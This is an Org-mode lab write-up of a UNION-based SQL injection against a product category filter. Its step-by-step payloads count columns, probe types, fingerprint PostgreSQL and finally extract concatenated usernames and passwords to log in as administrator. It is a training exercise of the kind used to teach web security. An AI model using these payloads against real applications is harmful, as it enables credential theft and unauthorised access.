#+title: SQL injection UNION attack, retrieving multiple values in a single column

* About
Sql injection on ~category~ filter

** End Goal
Login as ~administrator~ by retrieving password


* Steps
** Step 1
Like previous lab first of all determine how many columns are there
#+begin_src sql
'ORDER BY 1 --
#+end_src
200 success
#+begin_src sql
'ORDER BY 2 --
#+end_src
200 success
#+begin_src sql
'ORDER BY 3 --
#+end_src
500 error

column = 2

** Step 2
Determine which data types are those 2 columns are using
#+begin_src sql
'UNION SELECT 'abc', NULL --
#+end_src
500 error
#+begin_src sql
'UNION SELECT NULL, 'abc' --
#+end_src
200 success

So 2nd column using only using string type. But we have to get two field ~username~ and ~password~ . So how can we show both column data in one column that are supporting string value. We have to combine those 2 column value into one

Now there are syntax variation between different type of database system. We have to find what type of database system this lab is using

#+begin_src sql
'UNION SELECT NULL, VERSION() --
#+end_src
This lab using ~PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit~

* Solution
Now we can combine both username and password data into one column
#+begin_src sql
'UNION SELECT NULL, username || password FROM users --
#+end_src

Now login with administrator with password to solve the lab
